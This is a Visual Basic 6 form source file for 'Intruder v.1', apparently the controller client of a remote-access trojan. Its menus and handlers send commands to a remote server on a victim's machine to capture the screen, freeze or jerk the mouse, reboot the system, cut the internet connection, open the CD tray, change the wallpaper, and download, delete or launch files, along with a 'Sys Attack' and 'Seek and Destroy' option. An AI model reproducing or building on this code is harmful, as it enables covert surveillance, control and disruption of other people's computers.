VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "Mscomctl.ocx"
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "Comctl32.ocx"
Begin VB.MDIForm frmClient 
   AutoShowChildren=   0   'False
   BackColor       =   &H00000000&
   Caption         =   "(Intruder v.1)"
   ClientHeight    =   8520
   ClientLeft      =   168
   ClientTop       =   -72
   ClientWidth     =   12192
   Icon            =   "frmClient.frx":0000
   LinkTopic       =   "MDIForm1"
   Picture         =   "frmClient.frx":27A2
   Begin MSWinsockLib.Winsock tcpRestart 
      Left            =   240
      Top             =   6000
      _ExtentX        =   593
      _ExtentY        =   593
      _Version        =   393216
   End
   Begin VB.PictureBox Picture3 
      Align           =   3  'Align Left
      BorderStyle     =   0  'None
      Height          =   6648
      Left            =   0
      ScaleHeight     =   6648
      ScaleWidth      =   132
      TabIndex        =   15
      Top             =   336
      Width           =   135
   End
   Begin VB.PictureBox Picture2 
      Align           =   4  'Align Right
      BackColor       =   &H00404040&
      Height          =   6648
      Left            =   9420
      ScaleHeight     =   6600
      ScaleWidth      =   2724
      TabIndex        =   7
      Top             =   336
      Width           =   2775
      Begin VB.CommandButton Command1 
         Caption         =   "&Refresh"
         Height          =   280
         Left            =   0
         TabIndex        =   17
         Top             =   5880
         Width           =   2655
      End
      Begin VB.PictureBox Picture4 
         Height          =   10575
         Left            =   2640
         ScaleHeight     =   10524
         ScaleWidth      =   84
         TabIndex        =   16
         Top             =   0
         Width           =   135
      End
      Begin VB.DriveListBox driDrives 
         Height          =   315
         Left            =   1200
         TabIndex        =   10
         Top             =   2280
         Visible         =   0   'False
         Width           =   945
      End
      Begin VB.DirListBox DirFolders 
         Height          =   315
         Left            =   1200
         TabIndex        =   9
         Top             =   2640
         Visible         =   0   'False
         Width           =   975
      End
      Begin VB.FileListBox filFiles 
         Height          =   264
         Left            =   1200
         TabIndex        =   8
         Top             =   2880
         Visible         =   0   'False
         Width           =   975
      End
      Begin ComctlLib.TreeView tvwDirectory 
         Height          =   5295
         Left            =   0
         TabIndex        =   11
         Tag             =   "GetName"
         Top             =   240
         Width           =   2655
         _ExtentX        =   4678
         _ExtentY        =   9335
         _Version        =   327682
         Indentation     =   0
         LineStyle       =   1
         Sorted          =   -1  'True
         Style           =   7
         ImageList       =   "ilsTVWDirectory"
         BorderStyle     =   1
         Appearance      =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   8.4
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   0
         TabIndex        =   18
         Top             =   5640
         Width           =   3255
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   " Local File Manager"
         ForeColor       =   &H0000FF00&
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   0
         Width           =   2655
      End
      Begin ComctlLib.ImageList ilsTVWDirectory 
         Left            =   2040
         Top             =   6240
         _ExtentX        =   995
         _ExtentY        =   995
         BackColor       =   -2147483643
         ImageWidth      =   16
         ImageHeight     =   16
         MaskColor       =   128
         _Version        =   327682
         BeginProperty Images {0713E8C2-850A-101B-AFC0-4210102A8DA7} 
            NumListImages   =   10
            BeginProperty ListImage1 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":47BE
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":48D0
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":49E2
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":4AF4
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":4C06
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":4D18
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":4E2A
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":4F3C
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":504E
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {0713E8C3-850A-101B-AFC0-4210102A8DA7} 
               Picture         =   "frmClient.frx":5160
               Key             =   ""
            EndProperty
         EndProperty
      End
   End
   Begin VB.PictureBox Picture1 
      Align           =   2  'Align Bottom
      AutoRedraw      =   -1  'True
      BackColor       =   &H00404040&
      BorderStyle     =   0  'None
      Height          =   1260
      Left            =   0
      ScaleHeight     =   1260
      ScaleWidth      =   12192
      TabIndex        =   0
      Top             =   7260
      Width           =   12192
      Begin VB.CommandButton cmdSaveLog 
         Height          =   615
         Left            =   5520
         Picture         =   "frmClient.frx":5272
         Style           =   1  'Graphical
         TabIndex        =   3
         Top             =   240
         UseMaskColor    =   -1  'True
         Width           =   855
      End
      Begin RichTextLib.RichTextBox RTLog 
         Height          =   765
         Left            =   240
         TabIndex        =   2
         Top             =   240
         Width           =   5055
         _ExtentX        =   8911
         _ExtentY        =   1355
         _Version        =   393217
         BackColor       =   0
         ScrollBars      =   2
         TextRTF         =   $"frmClient.frx":557C
      End
      Begin VB.Frame Frame1 
         BackColor       =   &H00404040&
         Caption         =   "Setup"
         ForeColor       =   &H0000FF00&
         Height          =   975
         Left            =   6720
         TabIndex        =   4
         Top             =   120
         Width           =   5415
         Begin VB.CommandButton cmdServer 
            Caption         =   "&Server"
            Height          =   255
            Left            =   240
            TabIndex        =   6
            Top             =   600
            Width           =   1335
         End
         Begin VB.CommandButton cmdEMail 
            Caption         =   "Sys Attack"
            Enabled         =   0   'False
            Height          =   255
            Left            =   240
            TabIndex        =   5
            Top             =   240
            Width           =   1335
         End
         Begin VB.Line Line2 
            BorderColor     =   &H0000C000&
            X1              =   1740
            X2              =   1740
            Y1              =   240
            Y2              =   840
         End
         Begin VB.Line Line1 
            BorderColor     =   &H0000C000&
            X1              =   120
            X2              =   4320
            Y1              =   520
            Y2              =   520
         End
         Begin VB.Label lblName 
            Caption         =   "  Owners Name:  Unknown  "
            Height          =   220
            Left            =   1920
            TabIndex        =   13
            Top             =   240
            Width           =   2295
         End
         Begin VB.Label lblTime 
            Caption         =   "  Time Zone:  Unknown  "
            Height          =   220
            Left            =   1920
            TabIndex        =   12
            Top             =   600
            Width           =   2295
         End
         Begin VB.Image imgConnStatus 
            Height          =   384
            Left            =   4560
            Picture         =   "frmClient.frx":5664
            Top             =   240
            Width           =   384
         End
      End
      Begin VB.Label Label5 
         Caption         =   "DCroft 99"
         Height          =   255
         Left            =   5640
         TabIndex        =   31
         Top             =   360
         Width           =   735
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Event Log:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.4
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   240
         TabIndex        =   1
         Top             =   0
         Width           =   1575
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "  Save Log"
         ForeColor       =   &H0000C000&
         Height          =   255
         Left            =   5520
         TabIndex        =   30
         Top             =   840
         Width           =   855
      End
      Begin VB.Image img2 
         Height          =   384
         Left            =   360
         Picture         =   "frmClient.frx":5AA6
         Top             =   5880
         Visible         =   0   'False
         Width           =   384
      End
      Begin VB.Image img1 
         Height          =   384
         Left            =   480
         MouseIcon       =   "frmClient.frx":5EE8
         Picture         =   "frmClient.frx":632A
         Top             =   5880
         Visible         =   0   'False
         Width           =   384
      End
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   1200
      Top             =   6360
      _ExtentX        =   995
      _ExtentY        =   995
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   7
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":676C
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":8F1E
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":B6D0
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":DE82
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":E94C
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":EAA6
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmClient.frx":11258
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   750
      Top             =   6480
   End
   Begin MSWinsockLib.Winsock tcpClient 
      Left            =   240
      Top             =   6480
      _ExtentX        =   593
      _ExtentY        =   593
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar SB 
      Align           =   2  'Align Bottom
      Height          =   276
      Left            =   0
      TabIndex        =   19
      Top             =   6984
      Width           =   12192
      _ExtentX        =   21505
      _ExtentY        =   487
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   4
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   5186
            MinWidth        =   5186
            Text            =   "Connection Status:  DISCONNECTED"
            TextSave        =   "Connection Status:  DISCONNECTED"
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            Object.Width           =   3422
            MinWidth        =   3422
            Text            =   "Duration:  00:00"
            TextSave        =   "Duration:  00:00"
         EndProperty
         BeginProperty Panel3 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Width           =   3951
            MinWidth        =   3951
            Text            =   "Users IP:  Unknown"
            TextSave        =   "Users IP:  Unknown"
         EndProperty
         BeginProperty Panel4 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Alignment       =   1
            AutoSize        =   2
            Bevel           =   0
         EndProperty
      EndProperty
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.4
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin MSComctlLib.Toolbar Toolbar1 
      Align           =   1  'Align Top
      Height          =   336
      Left            =   0
      TabIndex        =   20
      Top             =   0
      Width           =   12192
      _ExtentX        =   21505
      _ExtentY        =   593
      ButtonWidth     =   487
      ButtonHeight    =   466
      Appearance      =   1
      ImageList       =   "ImageList1"
      _Version        =   393216
      BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628} 
         NumButtons      =   10
         BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   4
            Object.Width           =   156
         EndProperty
         BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Connect"
            Object.ToolTipText     =   "Connect"
            ImageIndex      =   1
         EndProperty
         BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "DisConnect"
            Object.ToolTipText     =   "Disconnect"
            ImageIndex      =   2
         EndProperty
         BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Browse"
            Object.ToolTipText     =   "Browse File Paths"
            ImageIndex      =   3
         EndProperty
         BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Msg"
            Object.ToolTipText     =   "Send Message"
            ImageIndex      =   4
         EndProperty
         BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Flush"
            Object.ToolTipText     =   "Flush Server"
            ImageIndex      =   5
         EndProperty
         BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Style           =   3
         EndProperty
         BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Help"
            Object.ToolTipText     =   "Help"
            ImageIndex      =   6
         EndProperty
         BeginProperty Button10 {66833FEA-8583-11D1-B16A-00C0F0283628} 
            Key             =   "Exit"
            Object.ToolTipText     =   "Exit"
            ImageIndex      =   7
         EndProperty
      EndProperty
      BorderStyle     =   1
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Height          =   240
         Index           =   1
         Left            =   4560
         Picture         =   "frmClient.frx":116AA
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   29
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   2
         Left            =   4920
         Picture         =   "frmClient.frx":117AC
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   28
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   3
         Left            =   5280
         Picture         =   "frmClient.frx":118AE
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   27
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   4
         Left            =   5640
         Picture         =   "frmClient.frx":119B0
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   26
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   5
         Left            =   6120
         Picture         =   "frmClient.frx":11AB2
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   25
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   6
         Left            =   6480
         Picture         =   "frmClient.frx":11BB4
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   24
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   7
         Left            =   6840
         Picture         =   "frmClient.frx":11CB6
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   23
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   8
         Left            =   7200
         Picture         =   "frmClient.frx":11DB8
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   22
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
      Begin VB.PictureBox picMenu 
         AutoSize        =   -1  'True
         Height          =   240
         Index           =   9
         Left            =   7560
         Picture         =   "frmClient.frx":11EBA
         ScaleHeight     =   192
         ScaleWidth      =   192
         TabIndex        =   21
         Top             =   0
         Visible         =   0   'False
         Width           =   240
      End
   End
   Begin VB.Menu mnuPopUp2 
      Caption         =   "Popup2"
      Visible         =   0   'False
      Begin VB.Menu mnuDown 
         Caption         =   "&Download"
      End
      Begin VB.Menu sep_ 
         Caption         =   "-"
      End
      Begin VB.Menu mnuRun 
         Caption         =   "&Launch Application"
      End
      Begin VB.Menu sep_2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuCopy_ 
         Caption         =   "&Copy"
      End
      Begin VB.Menu mnuMove_ 
         Caption         =   "&Move"
      End
      Begin VB.Menu mnuDel_ 
         Caption         =   "&Delete"
      End
      Begin VB.Menu mneRename 
         Caption         =   "&Rename"
      End
   End
   Begin VB.Menu mnuPopUp 
      Caption         =   "PopUp"
      Visible         =   0   'False
      Begin VB.Menu mnuUpload 
         Caption         =   " &Upload"
      End
      Begin VB.Menu mnuPopSep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuMove 
         Caption         =   " &Move"
      End
      Begin VB.Menu mnuCopy 
         Caption         =   " &Copy"
      End
      Begin VB.Menu mnuDel 
         Caption         =   " &Delete"
      End
      Begin VB.Menu mnuRunLocal 
         Caption         =   " &Run"
      End
      Begin VB.Menu mnuOpenLocal 
         Caption         =   " &Edit"
      End
      Begin VB.Menu popsep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuNewDir 
         Caption         =   " &New Directory "
      End
      Begin VB.Menu mnuPopRemoveDir 
         Caption         =   " &Remove Directory"
      End
   End
   Begin VB.Menu mnuFIle 
      Caption         =   "&File"
      Begin VB.Menu mnuConnect 
         Caption         =   "  &Choose Connection"
      End
      Begin VB.Menu mnuDisConnect 
         Caption         =   "  &Disconnect"
      End
      Begin VB.Menu sep5 
         Caption         =   "-"
      End
      Begin VB.Menu mnuFileBr 
         Caption         =   "  &File Browser"
      End
      Begin VB.Menu mnuTManage 
         Caption         =   "  &Task Manager"
      End
      Begin VB.Menu Sep3 
         Caption         =   "-"
      End
      Begin VB.Menu mnuFileExit 
         Caption         =   "  &Exit"
      End
   End
   Begin VB.Menu mnuTasks 
      Caption         =   "&Tasks"
      Begin VB.Menu mnuFlushServer 
         Caption         =   "  &Shut Down Server"
      End
      Begin VB.Menu mnuRemoveServ 
         Caption         =   "  &Seek and Destroy"
      End
      Begin VB.Menu mnuSefvStart 
         Caption         =   "  Res&tart the Server"
      End
      Begin VB.Menu sep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuOpenClose 
         Caption         =   "  &Open CD-ROM"
      End
      Begin VB.Menu Sep2 
         Caption         =   "-"
      End
      Begin VB.Menu muPlay 
         Caption         =   "  &Play .wav file"
      End
      Begin VB.Menu mnuDisHost 
         Caption         =   "  Disconnect Host"
      End
      Begin VB.Menu mnuMseKey 
         Caption         =   "  &Mouse"
         Begin VB.Menu mnuFrzMse 
            Caption         =   "  &Freeze Mouse"
         End
         Begin VB.Menu mnuMseSwap 
            Caption         =   "  &Swap buttons"
         End
         Begin VB.Menu muJerkMouse 
            Caption         =   "  &Jerk Mouse"
         End
      End
      Begin VB.Menu mnuReboot 
         Caption         =   "  &Reboot Users System"
      End
      Begin VB.Menu mnuScreen 
         Caption         =   "  &Screen"
         Begin VB.Menu mnuCapture 
            Caption         =   "  &Capture"
         End
         Begin VB.Menu mnuResolution 
            Caption         =   "  C&hange Resolution"
         End
         Begin VB.Menu mnuChgWlp 
            Caption         =   "  Change &Wallpaper"
         End
         Begin VB.Menu mnuWriteDesk 
            Caption         =   "  &Write on Desktop"
         End
         Begin VB.Menu muTaskBar 
            Caption         =   "  &Hide\Show TaskBar"
         End
         Begin VB.Menu mnuDispImg 
            Caption         =   "  &Display Image"
         End
      End
      Begin VB.Menu mnuMessage 
         Caption         =   "  &Message"
         Begin VB.Menu mnuCompose 
            Caption         =   "  &Compose"
         End
         Begin VB.Menu mnuPrint 
            Caption         =   "  P&rint String"
         End
      End
   End
   Begin VB.Menu mnuPing1 
      Caption         =   "&Ping"
   End
   Begin VB.Menu mnuHelp 
      Caption         =   "&Help"
      Begin VB.Menu mnuSimpHelp 
         Caption         =   "  &Simple Help"
      End
      Begin VB.Menu sep6 
         Caption         =   "-"
      End
      Begin VB.Menu mnuAbout 
         Caption         =   "  &About Intruder v.1.0"
      End
      Begin VB.Menu mnuDisclaim 
         Caption         =   "  &Disclaimer"
      End
   End
End
Attribute VB_Name = "frmClient"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private i As Integer
Private cntr As Integer


Dim sGetBuffer As String
Dim nfile As Long
Dim lLength As Long
Dim TotalBytes As Long

Dim NewPort As Integer

Private Sub cmdEMail_Click()
    frmSysAttack.Show
End Sub

Private Sub cmdSaveLog_Click()
    Dim FName As String
    Dim MyDate As String
    

    FName = App.Path & "\ClientLog.rtf"
    
    RTLog.Text = RTLog.Text & vbCrLf & "       Log saved on: " & Format(Date, "dddd, mmm d yyyy")
    RTLog.SaveFile FName
    
    
    MsgBox "Log Saved as: " & FName
    
End Sub

Private Sub cmdSysAtt_Click()
    frmSysAttack.Show
End Sub


Private Sub cmdServer_Click()
   FloaterForm Me, frmConfig
End Sub

Private Sub Command1_Click()
    BuildDriveList
End Sub



Private Sub MDIForm_Activate()
   MDIForm_Resize
End Sub

Private Sub MDIForm_Load()
    Top = 450
    Left = 450
    
    If tcpClient.State = sckClosed Then
      mnuTasks.Enabled = False
      With Toolbar1
        .Buttons(3).Enabled = False
        .Buttons(5).Enabled = False
        .Buttons(6).Enabled = False
        .Buttons(7).Enabled = False
      End With
      
    Else
      mnuTasks.Enabled = True
    End If
    
    RTLog.Text = IntroMsg & vbCrLf
    RTLog.SelLength = Len(RTLog.Text)
    RTLog.SelColor = vbGreen
    RTLog.SelLength = 0
    
    
    'THe Objective.
    'move the taskmanager in compact mode right above the "Local File Manager"
  
    frmTskManager.Height = 610 ' set it compact mode.
    frmTskManager.Move ((Width - Picture2.Width) - frmTskManager.Width + 340), _
    ((Top + Toolbar1.Height) + frmTskManager.Height) + 60
    
    FloaterForm Me, frmTskManager
    
    BuildDriveList
    
    DoMenuIcons
    
    NewPort = 1001
End Sub

Private Sub MDIForm_Unload(Cancel As Integer)
   tcpClient.Close
   If frmTskManager.Tag = "Running" Then
     Unload frmTskManager
   End If
   
   End
End Sub

Private Sub MDIForm_Resize()
    On Error Resume Next
    SB.Panels(3).MinWidth = Picture1.ScaleWidth - 150
    Command1.Top = Picture1.Top - (Command1.Height * 4.7)
    tvwDirectory.Height = (Command1.Top - (Label3.Height * 2)) - 50
    Label3.Top = tvwDirectory.Height + (Label3.Height)
    
    If frmTskManager.Height < 630 Then
       frmTskManager.Move ((Width - Picture2.Width) - frmTskManager.Width + 340), _
       ((Top + Toolbar1.Height) + frmTskManager.Height) + 60
    End If
End Sub

Private Sub mneRename_Click()
   frmFBrowser.Rename
End Sub

Private Sub mnuCapture_Click()
    SendData "Capture_Screen,"
    
    
    Dim Msg As String
    Msg = " -->Attempting User Screen Dump at: " & CurrentIP
    Logit Msg
End Sub

Private Sub mnuChgWlp_Click()
    Dim Res As Integer
    
    Res = MsgBox("This will select a random wallpaper image from " & vbCrLf & _
         "the hosts computer then activate it on the users system." _
         & vbCrLf & _
         "Do you wish to continue??", vbYesNo, "Change Wallpaper")
                  
         
    If Res = 6 Then
        SendData "Change_WallPaper,"
        
    Dim Msg As String
    Msg = " -->Attempting a random wallpaper switch at: " & CurrentIP
    Logit Msg
    End If
         
         
End Sub

Private Sub mnuCompose_Click()
    frmMsgType.Show
End Sub

Private Sub mnuConnect_Click()
    frmChooseConn.Show
End Sub



Private Sub mnuCopy__Click()
    frmFBrowser.Copy
End Sub

Private Sub mnuDel__Click()
   frmFBrowser.Del
End Sub

Private Sub mnuDisclaim_Click()
    frmGetText.Show
End Sub

Private Sub mnuDown_Click()
    frmFBrowser.Down
End Sub

Private Sub mnuMove__Click()
    frmFBrowser.MoveFile
End Sub

Private Sub mnuMove_Click()
    On Error GoTo Errh
    Dim Src As String, TmpSrc As String
    Dim Dest As String
    
    TmpSrc = GetFileNameFromPath(LocalFName)
    Src = LocalFName
    
    If Src = "" Then
      MsgBox "Invalid File Name.", vbCritical, "File Error"
      Exit Sub
    End If
    
    Dest = ShowBrowser
    
    If Right(Dest, 1) <> "\" Then
       Dest = Dest + "\"
    End If
    
    Dest = Dest & TmpSrc
    
    ' copy the file
    MoveFile Src, Dest
    
    Label3 = "  File Move Successfull."
    ' remove the file
    tvwDirectory.Tag = "Del"
    tvwDirectory_NodeClick tvwDirectory.SelectedItem
    
    Exit Sub
Errh:
    MsgBox err.Description, vbCritical, " ERROR#" & err.Number
End Sub

Private Sub mnuCopy_Click()
    '
    On Error GoTo Errh
    Dim Src As String, TmpSrc As String
    Dim Dest As String
    
    TmpSrc = GetFileNameFromPath(LocalFName)
    Src = LocalFName
    
    If Src = "" Then
      MsgBox "Invalid File Name.", vbCritical, "File Error"
      Exit Sub
    End If
    
    Dest = ShowBrowser()
    
    Exit Sub
    If Right(Dest, 1) <> "\" Then
       Dest = Dest + "\"
    End If
    
    Dest = Dest & TmpSrc
    
    ' copy the file
    FileCopy Src, Dest
    
    Label3 = "  File Copy Successfull."
    
    Exit Sub
Errh:
    MsgBox err.Description, vbCritical, " ERROR#" & err.Number
   
End Sub



Private Sub mnuDel_Click()
    Dim DelFname As String
    Dim Res As Integer
    
    DelFname = LocalFName
    
    If LocalFName = "" Then
      MsgBox "Invalid File Name.", vbCritical, "File Error"
      Exit Sub
    End If
       
    Res = MsgBox("Are you sure you want to delete the file: [" & LocalFName & "]?", vbYesNo, "Delete File?")
    
    If Res = 6 Then
       Kill LocalFName
       Label3 = " File Delete Successfull."
       tvwDirectory.Tag = "Del"
       tvwDirectory_NodeClick tvwDirectory.SelectedItem
    End If
    
End Sub

Private Sub mnuNewDir_Click()
    ' create a new dir
    tvwDirectory.Tag = "AddDir"
    
    tvwDirectory_NodeClick tvwDirectory.SelectedItem
End Sub


Private Sub mnuRename_Click()
    MsgBox tvwDirectory.Nodes(LocalDirName).Text
    
End Sub

Private Sub mnuDisconnect_Click()

  On Error Resume Next
    tcpClient.Close
    mnuTasks.Enabled = False
    'mnuReg.Enabled = False
      With Toolbar1
        .Buttons(3).Enabled = False
        .Buttons(5).Enabled = False
        .Buttons(6).Enabled = False
        .Buttons(7).Enabled = False
      End With
      
      With frmTskManager
        .SSTab1.TabEnabled(0) = False
        .SSTab1.TabEnabled(1) = False
        .SSTab1.TabEnabled(2) = False
        .List1.Clear
      End With
      
      'make sure there ae no open forms left
      Dim i As Integer
      
      For i = 1 To FrmCnt
         Unload frmClient.ActiveForm
      Next
      
      cmdEMail.Enabled = False
     ' cmdServer.Enabled = False
      imgConnStatus = img2
      lblName = " Owner:  Unknown"
      lblTime = " Time Zone:  Unknown"
      
      ' clear the log
      RTLog.Text = IntroMsg & vbCrLf
      ' clear drive and sys info
      With frmTskManager
        .TreeView1.Nodes.Clear
        .List1.Clear
        For i = 0 To 8
         .SysInfo(i) = ""
        Next i
      End With
      
End Sub

Private Sub mnuDisHost_Click()
    '
    SendData "HangUp,"
    
    
    Dim Msg As String
    Msg = " -->Disconecting host from internet at: " & CurrentIP
    Logit Msg
End Sub

Private Sub mnuDispImg_Click()
    frmPicIMg.Show
End Sub

Private Sub mnuFileBr_Click()
    frmFBrowser.Show
    
End Sub


Private Sub mnuFileExit_Click()
    Unload Me
End Sub

Private Sub mnuFlushServer_Click()
   On Error GoTo NotConnected
   Dim RV
   
   RV = MsgBox("You are about to terminate the Remote Server." & vbCrLf & _
          "Do you wish to continue?", vbYesNo, "ShutDown Server?")
   
   If RV = 6 Then
     SendData "ShutDown_Server," & ""
     Logit ShutServer
   End If
   
   Exit Sub
NotConnected:
   MsgBox "You are not connected!!", vbCritical, "Not Connected"
End Sub


Private Sub mnuHelpHelp_Click()
    FloaterForm Me, frmHelp
End Sub

Private Sub mnuFrzMse_Click()
   On err GoTo err
    SendData "FreezeMouse,"
    
    Dim MseFrz As String
    
    MseFrz = "--> Command sent to Freeze mouse at " & CurrentIP
    
    Logit MseFrz
    
err:
    MsgBox err.Description
End Sub

Private Sub mnuHelp_Click()
'
End Sub



Private Sub mnuTasksMsgCut_Click()
    Frame1.Visible = True
End Sub



Private Sub mnuTasksReboot_Click()
On Error GoTo NotConnected
      SendData "Msg," & "About to reboot system...... sorry!!"
NotConnected:
   MsgBox "You are not connected!!", vbCritical, "Not Connected"
End Sub



Private Sub mnuMseSwap_Click()
    '
    SendData "Swap_Mouse,"
End Sub


Private Sub mnuOpenClose_Click()
    SendData "OpenCDROM,"
    
    
    Dim Msg As String
    Msg = " -->Command sent to " & CurrentIP & " Open CD-Rom Door."
    Logit Msg
    
End Sub



Private Sub mnuPing1_Click()
    frmPing.Show
End Sub

Private Sub mnuPopRemoveDir_Click()
    Dim DelDir As String
    Dim Res As Integer
    
    DelDir = LocalFName
    
    If DelDir = "" Then
      MsgBox "Invalid Directory Name.", vbCritical, "File Error"
      Exit Sub
    End If
       
    Res = MsgBox("Are you sure you want to remove this dir: [" & DelDir & "]?", vbYesNo, "Delete File?")
    
    If Res = 6 Then
       DeleteDir DelDir
       Label3 = " Directory Removal Successfull."
       tvwDirectory.Tag = "Del"
